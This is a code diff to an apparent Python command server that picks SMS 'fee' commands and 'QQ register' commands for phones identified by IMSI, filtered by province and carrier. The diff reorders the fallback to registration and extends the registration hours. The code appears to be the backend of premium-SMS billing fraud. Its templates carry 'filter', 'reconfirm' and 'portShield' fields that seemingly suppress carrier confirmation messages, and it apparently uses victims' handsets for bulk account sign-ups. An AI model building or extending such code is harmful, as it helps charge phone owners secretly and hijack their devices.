@@ -138,7 +138,11 @@ def get_imsi_response(_imsi,_threads):
         else:
             # normal fee process
             if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour() :
-                return get_cmd(_record_user,_threads)
+                _return = get_cmd(_record_user,_threads)
+            if (_return==None or len(_return)<=1) and isOpenQqRegisterHour() and get_system_parameter_from_db('openRegister') == 'open':
+                _return = get_register_cmd(_record_user)
+                if _return!=None :
+                    _threads.append(threading.Thread(target=insert_register_cmd_log(_record_user,_return)))
     return _return
 
 def isOpenHour():
@@ -151,7 +155,7 @@ def isOpenHour():
 def isOpenQqRegisterHour():
     _result = True
     _hour = int(time.strftime("%H", time.localtime()))
-    if _hour >= 22 or (_hour>=0 and _hour<=7) :
+    if _hour >= 22 :
         _result = False
     return _result
 
@@ -167,13 +171,13 @@ def get_cmd(_user,_threads):
         _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and sms_cmd_covers.state = \'open\' and sms_cmd_configs.state = \'open\' order by rand() limit 1 '
         _record = dbConfig.get(_sql, _user['province'],_user['mobileType']) 
         if _record == None:
-            if isOpenQqRegisterHour():
-                _current_cmd_content = get_register_cmd(_user)
-                if _current_cmd_content!=None :
-                    _threads.append(threading.Thread(target=insert_register_cmd_log(_user,_current_cmd_content)))
-                return _current_cmd_content
-            else :
-                return None
+            # if isOpenQqRegisterHour() and get_system_parameter_from_db('openRegister') == 'open':
+            #     _current_cmd_content = get_register_cmd(_user)
+            #     if _current_cmd_content!=None :
+            #         _threads.append(threading.Thread(target=insert_register_cmd_log(_user,_current_cmd_content)))
+            #     return _current_cmd_content
+            # else :
+            return None
         else:
             _threads.append(threading.Thread(target=async_update_cmd_fee(_user,_record)))
             _current_cmd_content = FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace('[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
